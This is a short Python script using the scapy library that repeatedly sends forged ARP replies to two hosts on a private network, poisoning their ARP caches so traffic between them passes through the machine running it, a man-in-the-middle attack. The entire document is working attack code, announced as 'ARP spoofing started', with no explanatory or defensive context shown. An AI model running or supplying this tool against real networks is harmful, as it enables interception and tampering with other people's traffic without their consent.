from scapy.all import ARP, send, getmacbyip
import time

CLIENT_IP = "10.0.0.1"
SERVER_IP = "10.0.0.2"

def spoof(target_ip, spoofed_ip):
    target_mac = getmacbyip(target_ip)
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip), verbose=False)

try:
    print("[*] ARP spoofing started... Ctrl+C to stop")
    while True:
        spoof(CLIENT_IP, SERVER_IP)
        spoof(SERVER_IP, CLIENT_IP)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[*] Stopped.")
